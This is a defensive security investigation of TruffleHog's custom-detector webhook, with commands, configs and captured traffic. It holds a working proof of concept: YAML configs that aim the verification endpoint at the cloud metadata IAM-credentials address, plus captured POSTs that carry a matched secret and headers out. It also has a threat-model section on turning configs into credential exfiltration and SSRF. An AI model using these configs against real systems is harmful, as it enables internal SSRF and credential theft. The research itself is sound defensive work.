# TruffleHog Custom-Detector Webhook Verification — Security Investigation

> **Scope:** Empirical, run-first security investigation into TruffleHog's custom-detector *verification webhook* path.
> **Method:** Every claim below is backed by output captured at runtime through TruffleHog's **real** entry point — the `--config` flag loading a YAML config that defines TruffleHog's own `CustomRegex` detector. No mocks, debug hooks, or synthetic pattern substitutes were used.
> **Repository:** commit `e42153d44a5e5c37c1bd0c70e074781e9edcb760`, branch `trufflehog_e42153d44a5e`. Working tree clean at start; the only change introduced is this document.
> **Toolchain:** `go version go1.24.2 linux/amd64` (project convention: `go.mod` pins `go 1.23.1` + `toolchain go1.24.2`).
> **Binary version:** local source build reports **`dev`** (not a released version).

Every section leads with the **direct answer**, then shows the **exact command**, the **complete unedited output**, and **`file:line` citations**. Statements are labeled **OBSERVED** (captured at runtime) or **INFERRED** (derived from reading source, not directly observed).

---

## 1. Summary — Direct Answers

| # | Question | Direct answer (OBSERVED unless noted) |
|---|----------|----------------------------------------|
| 1 | **SSRF reachability** — can a config point a verification webhook at an internal / cloud-metadata address? | **Yes, with no protection.** The only endpoint guard, `ValidateVerifyEndpoint` (`pkg/custom_detectors/validation.go:L35-L44`), performs **no host/IP allowlist or denylist**. A config pointing at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` reached that exact path verbatim, carrying the matched secret. |
| 2 | **TLS / MITM** — what certificate validation happens over HTTPS? Can a network MITM intercept? | **Go's default strict verification applies; an untrusted-cert MITM is defeated.** The webhook uses `common.SaneHttpClient()` (`custom_detectors.go:L62`) whose transport sets **no `TLSClientConfig`** (`http.go:L211-L221`). Against an untrusted self-signed cert the handshake was refused and **the secret was never transmitted**. ⚠️ The result status is **`unverified`**, *not* `unknown` (correction below). |
| 3 | **Verification amplification** — one verification or many? Is there a cap? | **Exactly one webhook POST per match permutation, hard-capped at `maxTotalMatches = 100`** (`custom_detectors.go:L23`). 150 input matches produced exactly 100 POSTs, stable across repeated runs. |
| 4 | **Data exfiltration surface** — what data leaves the process? | **The full matched secret plus config-controlled headers plus `User-Agent: TruffleHog`**, POSTed as JSON to the config-controlled endpoint. Body = `json.Marshal` of a nested map (`custom_detectors.go:L214-L216`); headers attached verbatim (`L232-L238`). |
| 5 | **ReDoS** — how are complex/malicious regexes handled? | **No catastrophic backtracking — Go's `regexp` (RE2) guarantees linear-time matching.** A pathological `(a+)+$` pattern over a 500,000-char input matched in single-digit milliseconds; an equivalent backtracking engine went exponential. |
| 6 | **Overall threat model** | **Whoever supplies `--config` can weaponize verification for credential exfiltration / internal SSRF.** That party controls the endpoint (unfiltered), the headers (verbatim), and the regex (what secret is captured). The `http://`+`unsafe` check is a plaintext opt-in, **not** an SSRF control. Mitigations observed: strict TLS defeats untrusted-cert MITM; amplification is bounded at 100 and RE2 precludes ReDoS. |

### 1.1 Observed corrections to the working hypothesis

Four points were re-verified against source and runtime and **differ from the initial hypothesis**; they are stated here up front and substantiated in the relevant sections:

1. **`maxTotalMatches = 100` is at `custom_detectors.go:L23`** (the explanatory comment occupies L20–L22). See §5.
2. **The config-parse fatal `logFatal(err, "error parsing the provided configuration file")` is at `main.go:L465`.** See §3.
3. **A TLS failure yields status `unverified`, NOT `unknown`.** The `x509` error from `httpClient.Do(req)` is *swallowed* by `continue` at `custom_detectors.go:L241-L242`, so no verification error is attached. "unknown" was **NOT observed at this commit**. See §4.
4. **`successRanges` is a runtime no-op at this commit.** It is parsed and stored (`proto/custom_detectors.proto:L30`, struct field `custom_detectors.pb.go:L190`) but **never consulted** by the verification path — verification is gated *solely* on HTTP 200 (`custom_detectors.go:L249`). This was proven empirically through the canonical path. See §6.

---

## 2. Environment & Build

**Direct answer:** The scanner was built from the unmodified source tree with the project's own toolchain and run through its documented CLI. All observation artifacts lived under `/tmp` and were removed on completion; the repository tree remained byte-for-byte unchanged except for this document.

### 2.1 Repository state and toolchain

```
$ git rev-parse HEAD
e42153d44a5e5c37c1bd0c70e074781e9edcb760

$ git rev-parse --abbrev-ref HEAD
trufflehog_e42153d44a5e

$ git status --porcelain
            # (empty — clean working tree at start)

$ go version
go version go1.24.2 linux/amd64
```

`go.mod` (unmodified) pins the toolchain used:

```
go 1.23.1

toolchain go1.24.2
```

### 2.2 Build (canonical)

```
$ CGO_ENABLED=0 go build -o /tmp/trufflehog .
$ /tmp/trufflehog --version
trufflehog dev
```

The binary reports version **`dev`** — this is the default `BuildVersion` for a local source build, **not** a released version. The `Dockerfile` uses the same `CGO_ENABLED=0 go build` convention.

### 2.3 Canonical entry point and probe artifacts

All behavior was exercised through TruffleHog's real input path:

```
--config (main.go:L70)  →  config.Read (main.go:L463)  →  config.NewYAML / protoyaml.UnmarshalStrict (pkg/config/config.go:L30)  →  custom_detectors.NewWebhookCustomRegex (pkg/config/config.go:L36)
```

Invocation form (from `pkg/custom_detectors/CUSTOM_DETECTORS.md`):

```
/tmp/trufflehog filesystem <target> --config=<config.yaml>
```

The **probe config** is the verbatim `HogTokenDetector` example from `pkg/custom_detectors/CUSTOM_DETECTORS.md:L17-L31` (TruffleHog's own `CustomRegex` detector — **not** a synthetic substitute), with the endpoint pointed at a controlled observation server:

```yaml
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}'
    verify:
      - endpoint: http://127.0.0.1:8000/
        unsafe: true
        headers: ["Authorization: super secret authorization header"]
```

The **scan target** `data.txt` (based on the canonical example in `CUSTOM_DETECTORS.md:L64-L68`) is 145 bytes; line 3 is:

```
hog token: pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn
```

> The token value above is a synthetic 40-character example string taken directly from TruffleHog's own documentation. It is not a real credential.

The controlled observation server is a small Python `http.server` that logs each inbound request's request line, headers, and body, then returns a chosen status code. For the HTTPS objective it is wrapped with an `ssl` context using an untrusted self-signed certificate (`CN=127.0.0.1`, SAN `IP:127.0.0.1`). These servers ran only on loopback (and, for the SSRF objective, behind a kernel redirect) and were for observation only.

### 2.4 A note on the on-the-wire body

The detector regex `[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}` has an optional non-token character on each side of the 40-character capture group. On line 3 those bookends match the **space before** the token and the **newline after** it. Therefore:

- **Index 0** of the `token` array is the **full match**: a leading space, the 40 characters, and a trailing newline.
- **Index 1** is the **clean 40-character capture group**.

When `json.Marshal` (`custom_detectors.go:L214-L216`) serializes the trailing newline it becomes the two-character JSON escape `\n`. So the on-the-wire array renders as:

```
[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]
```

This exact shape recurs in the captured evidence throughout the document.

---

## 3. SSRF Reachability

**Direct answer (OBSERVED):** **There is no SSRF protection on the custom-detector webhook path.** No allowlist, denylist, or address filtering exists. A config whose `verify.endpoint` points at the cloud instance-metadata address `169.254.169.254` caused TruffleHog to POST the matched secret to the exact IMDS IAM-credentials path. The **only** endpoint validation is a check that a plaintext `http://` endpoint carries `unsafe: true` — this is a plaintext opt-in, **not** an SSRF control.

### 3.1 The only guard in the code path

`ValidateVerifyEndpoint` is the sole endpoint validator run at config-load time. Its entire body:

- `pkg/custom_detectors/validation.go:L35-L44` — the function.
- `pkg/custom_detectors/validation.go:L40-L42` — the only content check:

```go
if strings.HasPrefix(endpoint, "http://") && !unsafe {
    return fmt.Errorf("http endpoint must have unsafe=true")
}
```

There is **no** host/IP allowlist or denylist anywhere in this function or in the generated proto validation. The generated validator only performs a permissive parse — `url.Parse(m.GetEndpoint())` at `pkg/pb/custom_detectorspb/custom_detectors.pb.validate.go:L335` — and explicitly has `// no validation rules for Unsafe` at `L347`. Any syntactically valid URL (including internal, loopback, and link-local metadata hosts) is accepted.

### 3.2 Evidence — reaching the `169.254.169.254` metadata endpoint

The probe config was pointed at the real AWS IMDS IAM-credentials path. Because `169.254.169.254` is not bound to a local interface in this environment, a kernel NAT redirect transparently routed TruffleHog's outbound connection to the loopback capture server — TruffleHog itself dialed the real metadata IP through the canonical `--config` path; the redirect only intercepts what leaves the process:

```
$ iptables -t nat -A OUTPUT -d 169.254.169.254 -p tcp --dport 80 -j REDIRECT --to-ports 8080
$ cat /tmp/th_probe/config_imds.yaml
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}'
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        unsafe: true
        headers: ["Authorization: super secret authorization header"]

$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_imds.yaml
```

Scanner result: `✅ Found verified result` with `verified_secrets: 1` (`scan_duration: 6.328302ms`). The complete egress captured at the server:

```
===== EGRESS REACHED 169.254.169.254:80 @ 2026-07-13T17:22:00.682929 =====
RequestLine: POST /latest/meta-data/iam/security-credentials/ HTTP/1.1
--- Headers ---
Host: 169.254.169.254
User-Agent: TruffleHog
Content-Length: 121
Authorization: super secret authorization header
Accept-Encoding: gzip
--- Body ---
{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
===== END =====
[stdlib] "POST /latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 -
```

The classic cloud-metadata IAM-credentials path is reached **verbatim**, carrying the matched secret in the body and the config-supplied `Authorization` header. No validation stood in the way. (The iptables rule was removed after capture; see §9.)

### 3.3 Secondary / edge case — `http://` without `unsafe`

With an `http://` endpoint and **no** `unsafe: true`, config load fails at the canonical entry point before any scanning:

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_nounsafe.yaml ; echo "EXIT=$?"
2026-07-13T17:22:21Z	error	trufflehog	error parsing the provided configuration file	{"error": "http endpoint must have unsafe=true"}
EXIT=1
```

The fatal is emitted by `logFatal(err, "error parsing the provided configuration file")` at **`main.go:L465`**, and the underlying error text originates at `validation.go:L41`.

**This is a plaintext-HTTP opt-in, not an SSRF control.** To prove it is orthogonal to the target host, the same internal/metadata host over **`https://` without `unsafe`** loads and runs fine (the guard at `validation.go:L40` only triggers on the `http://` prefix):

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_https_nounsafe.yaml ; echo "EXIT=$?"
Found unverified result 🐷🔑❓
...
finished scanning {"chunks": 1, "bytes": 145, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "14.078716ms", "trufflehog_version": "dev", ...}
EXIT=0
```

So `https://` to any host — and `http://`+`unsafe:true` to any host — both reach freely. The check gates *plaintext*, not *destination*.

**Citations:** `validation.go:L35-L44` (guard), `L40-L42` (the only check), `L41` (error string); `custom_detectors.pb.validate.go:L335` (permissive `url.Parse`), `L347` (`// no validation rules for Unsafe`); `main.go:L465` (config-parse fatal).

---

## 4. TLS / MITM Exposure

**Direct answer (OBSERVED):** **HTTPS verification requests use Go's default strict certificate and hostname verification**, because the webhook client's transport sets no `TLSClientConfig`. A network man-in-the-middle presenting an **untrusted** certificate is defeated: the TLS handshake is refused and **the secret is never transmitted**. Trust in the certificate is the *sole* blocker — supplying the cert as a trusted root flips the result to verified.

### 4.1 Which client is used

The custom-detector package declares a single shared client:

```go
// pkg/custom_detectors/custom_detectors.go:L62
var httpClient = common.SaneHttpClient()
```

`SaneHttpClient()` (`pkg/common/http.go:L223-L228`) sets a 5-second timeout (`DefaultResponseTimeout`, `http.go:L209`) and uses `saneTransport` (`http.go:L211-L221`). That transport sets `Proxy: http.ProxyFromEnvironment` and a dialer, but **no `TLSClientConfig`**. With a nil TLS config, Go's `crypto/tls` applies its defaults: `InsecureSkipVerify` is false (full certificate-chain + hostname verification) and a nil `RootCAs` uses the host's root CA store.

A separate client, `PinnedRetryableHttpClient` (`http.go:L159-L177`), *does* set `TLSClientConfig` with a pinned root pool (`L163-L164`) — but it is a **different** client and is **not** used by custom detectors.

### 4.2 Evidence — untrusted self-signed certificate (MITM analog)

The webhook was pointed at an HTTPS server presenting an untrusted self-signed certificate (`CN=127.0.0.1`, issuer `CN=127.0.0.1`, SAN `IP:127.0.0.1`):

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_https.yaml
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-07-13T17:22:55Z	info-0	trufflehog	running source	{"source_manager_worker_id": "iqLV5", "with_units": true}
Found unverified result 🐷🔑❓
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn
Name: HogTokenDetector
File: /tmp/th_probe/data.txt
Line: 3

2026-07-13T17:22:55Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 145, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "19.653316ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":13}}
```

The HTTPS server's request log was **empty (0 bytes)** — the TLS handshake was refused, so **the secret was never transmitted**. A network MITM presenting an untrusted certificate cannot intercept the webhook traffic.

### 4.3 Canonical contrast — trust is the sole blocker

Re-running the **same binary and same config**, but adding the server's certificate as a trusted root via `SSL_CERT_FILE` (honored by Go's `crypto/x509`), flips the outcome:

```
$ SSL_CERT_FILE=/tmp/th_probe/cert.pem /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_https.yaml
✅ Found verified result 🐷🔑
...
finished scanning {"chunks": 1, "bytes": 145, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "15.427058ms", "trufflehog_version": "dev", ...}
```

Now the secret POST arrives at the HTTPS server (log grew to 424 bytes):

```
===== HTTPS INBOUND POST @ 2026-07-13T17:23:12.345507 =====
RequestLine: POST / HTTP/1.1
--- Headers ---
Host: 127.0.0.1:8443
User-Agent: TruffleHog
Content-Length: 121
Authorization: super secret authorization header
Accept-Encoding: gzip
--- Body ---
{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
===== END =====
[stdlib] "POST / HTTP/1.1" 200 -
```

The only variable that changed was whether the certificate was trusted. This confirms the default strict verification is doing the blocking.

### 4.4 ⚠️ Observed correction — status is `unverified`, not `unknown`

The working hypothesis predicted a TLS failure would "downgrade to **unknown**." The **OBSERVED** status is **`unverified`** (`Found unverified result 🐷🔑❓`, `unverified_secrets: 1`). The reason is that the `x509` error returned by `httpClient.Do(req)` is **swallowed** by a bare `continue`:

```go
// pkg/custom_detectors/custom_detectors.go:L240-L242
resp, err := httpClient.Do(req)
if err != nil {
    continue
}
```

Because `createResults` never calls `SetVerificationError` on this path, no `VerificationError` is attached to the result, and the CLI counts it as a plain unverified secret rather than `unknown`. **"unknown" was NOT observed at this commit.**

**Citations:** `custom_detectors.go:L62` (client); `http.go:L223-L228` (`SaneHttpClient`), `L211-L221` (`saneTransport`, no `TLSClientConfig`), `L209` (`DefaultResponseTimeout`), `L159-L177` (unused pinned client); `custom_detectors.go:L240-L242` (error swallow), `L249` (200-only verify gate).

---

## 5. Verification Amplification

**Direct answer (OBSERVED):** **A detector dispatches exactly one webhook POST per match permutation, and the total is hard-capped at `maxTotalMatches = 100`.** A file with 150 distinct matches produced exactly 100 POSTs, and the invariant `verified + unverified == 100` held in every run. The cap is a stable ceiling regardless of how many matches the input contains.

### 5.1 Mechanism

Within `FromData`, the per-regex matches are combined into a cartesian product and one verification is dispatched per permutation:

- `matches := permutateMatches(regexMatches)` — call site at `custom_detectors.go:L110`; function defined at `L317`.
- The results channel is buffered at the cap: `resultsCh := make(chan detectors.Result, maxTotalMatches)` at `L115`.
- Each permutation runs in its own `errgroup` goroutine: `g.Go(...)` at `L155` calling `c.createResults(...)` at `L156`.
- The cap constant: `const maxTotalMatches = 100` at **`custom_detectors.go:L23`** (the explanatory comment occupies `L20-L22`).
- The product size is clamped to the cap in `productIndices` (`L287`): `if count > maxTotalMatches { count = maxTotalMatches }` at `L295-L296`.

### 5.2 Evidence — counting POSTs at increasing N

Scan targets were generated with `N` distinct 40-character tokens (distinct so the verification cache does not dedup them), each scanned via the canonical `--config` path:

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data${N}.txt --config=/tmp/th_probe/config.yaml
```

With a **single-threaded** verification server (the 5-second client timeout, `http.go:L209`, causes some permutations to time out under 100-way concurrency, splitting the fixed total of 100 between verified and unverified):

```
N=10        -> verified=10  unverified=0   (sum=10)   ; server POSTs=10
N=150 run1  -> verified=65  unverified=35  (sum=100)  ; server POSTs=65
N=150 run2  -> verified=96  unverified=4   (sum=100)  ; server POSTs=96
N=150 run3  -> verified=85  unverified=15  (sum=100)  ; server POSTs=85
```

With a **threaded** verification server (backlog raised so all concurrent requests are accepted and counted within the 5s window):

```
N=10   run1  -> verified=10  unverified=0  (sum=10)   ; server RECEIVED POSTs=10
N=150  run1  -> verified=100 unverified=0  (sum=100)  ; server RECEIVED POSTs=100
N=150  run2  -> verified=100 unverified=0  (sum=100)  ; server RECEIVED POSTs=100
```

Two invariants hold across every run (repeated ≥2× for stability):

1. **Exactly one webhook POST per permutation** — with the threaded server that accepts all connections, 150 matches produced exactly **100** received POSTs, and N=10 produced exactly 10.
2. **`verified + unverified == 100` in every N=150 run** — the fixed total of 100 is the `maxTotalMatches` cap; only its split between verified/unverified varies with server timing.

So 150 input matches are capped to 100 verifications; the cap is stable.

### 5.3 Cache nuance

The per-permutation POSTs happen **inside `FromData`**, *before* the engine-level `verificationcache` is consulted. The cache is keyed on the raw secret and strips the raw fields before storing — `copyForCaching.Raw = nil` (`verification_cache.go:L128`), `copyForCaching.RawV2 = nil` (`L129`), and the cache key `keyBytes := bytes.Join([][]byte{result.Raw, result.RawV2}, nil)` (`L140`). This deduplicates identical secrets **across** the scan, but it does **not** reduce the in-`FromData` POST count for distinct matches. The governing bound on webhook fan-out is therefore `maxTotalMatches = 100`.

**Citations:** `custom_detectors.go:L23` (cap constant), `L110`/`L317` (`permutateMatches`), `L115` (buffered channel), `L155-L156` (per-permutation goroutine), `L287`/`L295-L296` (`productIndices` clamp); `http.go:L209` (5s timeout); `verification_cache.go:L128-L129`, `L140` (raw stripping / cache key).

---

## 6. Data Exfiltration Surface

**Direct answer (OBSERVED):** **The full matched secret, every configured header, and a `User-Agent: TruffleHog` header are POSTed as JSON to the config-controlled endpoint.** The body is `json.Marshal` of a map keyed by detector name then regex name, whose value is `[full match, capture group…]`. On any HTTP 200 the result is marked verified; on a non-200 the secret **is still transmitted** and then marked unverified. Verification is gated **solely** on HTTP 200 — `successRanges` has no effect.

### 6.1 What is built and sent

The request body is produced at `custom_detectors.go:L214-L216`:

```go
jsonBody, err := json.Marshal(map[string]map[string][]string{
    c.GetName(): match,
})
```

Configured headers are attached verbatim in the loop at `L232-L238` (`strings.Cut(header, ":")` at `L233`, `req.Header.Add(key, strings.TrimLeft(value, "\t\n\v\f\r "))` at `L238`). The `User-Agent: TruffleHog` header is injected by `CustomTransport.RoundTrip` at `http.go:L100` (value from `UserAgent()`, `http.go:L92-L97`). The request leaves the process at `httpClient.Do(req)` (`custom_detectors.go:L240`). On HTTP 200, `result.Verified = true` (`L249`, `L251`) and the response body is truncated to 200 characters and stored in `ExtraData["response"]` (`L258-L266`).

### 6.2 Evidence — the exact request (HTTP 200 → Verified)

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config.yaml
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-07-13T17:21:33Z	info-0	trufflehog	running source	{"source_manager_worker_id": "4Mhsn", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn
Response: 
Name: HogTokenDetector
File: /tmp/th_probe/data.txt
Line: 3

2026-07-13T17:21:33Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 145, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "6.77249ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The complete request captured at the webhook server:

```
===== INBOUND POST @ 2026-07-13T17:21:33.894564 =====
RequestLine: POST / HTTP/1.1
--- Headers ---
Host: 127.0.0.1:8000
User-Agent: TruffleHog
Content-Length: 121
Authorization: super secret authorization header
Accept-Encoding: gzip
--- Body ---
{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
===== END =====
[stdlib] "POST / HTTP/1.1" 200 -
```

The transmitted data surface is therefore:

- **Body:** `{"<detector name>":{"<regex name>":["<full match>","<capture group>"]}}`. Here index 0 is the full match (leading space + 40 chars + trailing `\n`) and index 1 is the clean 40-character capture group. The full secret leaves the process.
- **Headers:** every entry from the config's `headers` list verbatim (here `Authorization: super secret authorization header`), plus `User-Agent: TruffleHog`, plus Go's `Accept-Encoding: gzip` and `Content-Length`.
- **Destination:** the config-controlled `endpoint`.

### 6.3 Status-state summary (OBSERVED)

- **HTTP 200 → Verified.** Secret transmitted; `result.Verified = true` (`L249`, `L251`). (Shown above.)
- **Non-200 (e.g., 403) → unverified, but the request WAS sent.** The secret is transmitted, then marked unverified because `resp.StatusCode != 200` (the gate at `L249`):

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config.yaml   # server returns 403
Found unverified result 🐷🔑❓
...
finished scanning {"chunks": 1, "bytes": 145, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "6.557513ms", "trufflehog_version": "dev", ...}
```

server side (secret still exfiltrated):

```
===== INBOUND POST @ 2026-07-13T17:27:48.898978 =====
RequestLine: POST / HTTP/1.1
--- Headers ---
Host: 127.0.0.1:8000
User-Agent: TruffleHog
Content-Length: 121
Authorization: super secret authorization header
Accept-Encoding: gzip
--- Body ---
{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
===== END =====
[stdlib] "POST / HTTP/1.1" 403 -
```

- **TLS / connection error → unverified, secret NOT transmitted.** The handshake is refused and the error is swallowed at `L240-L242` (see §4).

### 6.4 Observed finding — `successRanges` is a runtime no-op

The proto schema exposes a `successRanges` field (`proto/custom_detectors.proto:L30`; struct field at `custom_detectors.pb.go:L190`; accessor `GetSuccessRanges()` at `custom_detectors.pb.go:L246`). One might expect declaring a success range (e.g., `["403"]`) to make a 403 response verify. **It does not.** Verification is hardcoded to HTTP 200 at `custom_detectors.go:L249`, and `GetSuccessRanges()` is never called anywhere in `pkg/custom_detectors/custom_detectors.go`.

Proven empirically through the canonical path — a config declaring `successRanges: ["403"]` against a server returning 403:

```
$ /tmp/trufflehog filesystem /tmp/th_probe/data.txt --config=/tmp/th_probe/config_successranges.yaml
Found unverified result 🐷🔑❓
...
finished scanning {"chunks": 1, "bytes": 145, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "5.257302ms", "trufflehog_version": "dev", ...}
```

server side confirms the 403 response was delivered and ignored for verification purposes:

```
[stdlib] "POST / HTTP/1.1" 403 -
```

Despite the config declaring 403 as a "success range," the result stayed **unverified**. `successRanges` is parsed and stored but has **zero runtime effect** at this commit. (It is also never *validated* at load: `ValidateVerifyRanges`, `validation.go:L55-L96`, is dead code — the constructor `NewWebhookCustomRegex` calls `ValidateKeywords`, `ValidateRegex`, `ValidateVerifyEndpoint`, and `ValidateVerifyHeaders`, but not `ValidateVerifyRanges`.)

**Citations:** `custom_detectors.go:L214-L216` (body marshal), `L232-L238` (header loop), `L240` (egress), `L249`/`L251` (200-only verify), `L258-L266` (response truncation); `http.go:L92-L97` (`UserAgent`), `L100` (User-Agent injection); `proto/custom_detectors.proto:L30`, `custom_detectors.pb.go:L190`/`L246` (`successRanges` schema, never consulted); `validation.go:L55-L96` (unused `ValidateVerifyRanges`).

---

## 7. Regular-Expression Denial of Service (ReDoS)

**Direct answer (OBSERVED):** **Custom-detector patterns cannot cause catastrophic-backtracking ReDoS.** They are compiled with Go's standard `regexp` package, which uses the RE2 engine and guarantees linear-time matching. A deliberately pathological pattern `(a+)+$` — which sends classic backtracking engines exponential — matched a 500,000-character input in single-digit milliseconds.

### 7.1 Which engine is used

- `ValidateRegex` compiles each pattern at load time via `regexp.Compile(reg)` — `validation.go:L23` (function), `L28` (compile).
- At scan time, `FromData` compiles the regex with `regexp.Compile(regex)` (`custom_detectors.go:L92`) and matches with `regex.FindAllStringSubmatch(dataStr, -1)` (`L97`).

Go's `regexp` is the RE2 engine, which forbids the constructs (backreferences, lookaround) that require backtracking and thereby guarantees linear-time execution.

### 7.2 Evidence — pathological pattern, growing input

The probe config used TruffleHog's own `CustomRegex` detector with the pathological pattern (loaded, unmodified, through `--config`):

```yaml
detectors:
  - name: ReDoSProbe
    keywords: [trigger]
    regex:
      evil: '(a+)+$'
```

The config **compiled and loaded without error** — RE2 permits nested quantifiers like `(a+)+` (it only rejects backreferences/lookaround, which is why TruffleHog offers the separate `validations` feature). Scan inputs were `"trigger " + "a"*n + "!"` (the trailing `!` forces the `$` anchor to fail, the worst case for a backtracking engine). Measured `scan_duration` from the scanner:

```
TruffleHog RE2, pattern (a+)+$ :
  n=50       -> scan_duration = 4.958909ms
  n=500      -> scan_duration = 4.622311ms
  n=5000     -> scan_duration = 4.91662ms
  n=50000    -> scan_duration = 5.725957ms
  n=500000   -> scan_duration = 9.428377ms
```

A 10,000× increase in input length (n=50 → n=500,000) produced under a 2× increase in matching time — i.e., linear/bounded, with no blowup.

For contrast, the **same** pattern in a backtracking engine (Python's `re`) goes exponential:

```
Python re, pattern (a+)+$ :
  n=20  -> 0.084s
  n=24  -> 1.409s
  n=26  -> 5.533s
  n=28  -> 21.806s
```

At n=28 the backtracking engine already takes ~22 seconds; TruffleHog/RE2 handles n=500,000 in ~9 ms. The linear-time guarantee holds through the canonical `--config` path.

**Citations:** `validation.go:L23`/`L28` (`ValidateRegex` → `regexp.Compile`); `custom_detectors.go:L92` (`regexp.Compile`), `L97` (`FindAllStringSubmatch`).

### 7.3 Web corroboration

These authoritative sources corroborate (but do not replace) the runtime observations above; quotations are kept minimal.

- **RE2 linear time.** Go's official `regexp` documentation states the implementation is "guaranteed to run in time linear in the size of the input," and notes that its leftmost-first matching achieves the same semantics as Perl/Python "without the expense of backtracking." RE2 omits lookaround and backreferences precisely to preserve this guarantee. (Source: `pkg.go.dev/regexp`.)
- **Go default TLS.** The `crypto/tls` documentation states that "if RootCAs is nil, TLS uses the host's root CA set." `InsecureSkipVerify` defaults to false; the docs warn that enabling it makes TLS "susceptible to man-in-the-middle attacks" and is "only for testing." Since `SaneHttpClient` sets no TLS config, the strict defaults apply. (Source: `pkg.go.dev/crypto/tls`.)
- **`169.254.169.254` metadata endpoint.** This is a link-local address serving the cloud Instance Metadata Service, described as "only accessible from the instance" and not reachable "from the internet or from other instances." The path `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns temporary IAM credentials, making it a canonical SSRF exfiltration target. (Sources: AWS EC2 IMDS documentation; SANS Institute IMDS write-up.)

---

## 8. Threat Model Synthesis

**Direct answer:** **An actor who can supply or contribute a custom-detector configuration can weaponize the verification subsystem for credential exfiltration and internal SSRF.** The trust boundary is precisely *whoever provides `--config`*.

### 8.1 The trust boundary

The party that supplies the `--config` file controls all three inputs that matter:

- **The `verify.endpoint`** — any internal, loopback, or cloud-metadata host. There is **no filtering** (§3). TruffleHog will dial it and POST to it.
- **The `headers`** — attached verbatim to the outbound request (§6), so the attacker can add whatever authentication or routing headers the target expects.
- **The `regex`** — selects exactly what secret text is captured from scanned data and placed into the request body (§6).

TruffleHog then transmits the matched secret material to that endpoint. The **only** endpoint guard (`http://` requires `unsafe: true`, §3.3) is a plaintext opt-in, **not** an SSRF protection — `https://` to any host and `http://`+`unsafe:true` to any host both reach freely.

This aligns the vector with the **credential-exfiltration** threat class (matched secrets sent to an attacker-chosen endpoint) rather than merely blind SSRF, because the configuration author both chooses the destination and causes secret material to be placed in the request body.

### 8.2 Mitigating factors (OBSERVED)

- **Strict TLS.** HTTPS verification uses Go's default strict certificate/hostname verification, so a *network* man-in-the-middle presenting an untrusted certificate cannot intercept the traffic (§4).
- **Bounded amplification.** Fan-out is hard-capped at `maxTotalMatches = 100` per detector invocation (§5).
- **No ReDoS.** RE2's linear-time guarantee precludes catastrophic-backtracking denial of service from hostile patterns (§7).

### 8.3 Recommendations (DESCRIBED, not implemented)

This is a read-only investigation; the following are **described** as options and are **not** implemented in code:

- An endpoint allowlist/denylist for `verify.endpoint`, or an SSRF guard that blocks link-local (`169.254.0.0/16`), loopback, and private RFC 1918 ranges by default.
- Treating custom-detector verification as opt-in per scan, or requiring an explicit trust acknowledgment when a config defines verification endpoints.
- Attaching a `VerificationError` on transport/TLS failure (rather than swallowing it at `custom_detectors.go:L241-L242`) so operators can distinguish "endpoint unreachable / MITM blocked" from "endpoint said not-verified."
- Either honoring `successRanges` or removing it, so the schema does not imply behavior that does not exist (§6.4).

---

## 9. Coverage Pass

Every named sub-question and named item is addressed:

| Named item / sub-question | Where | Result |
|---------------------------|-------|--------|
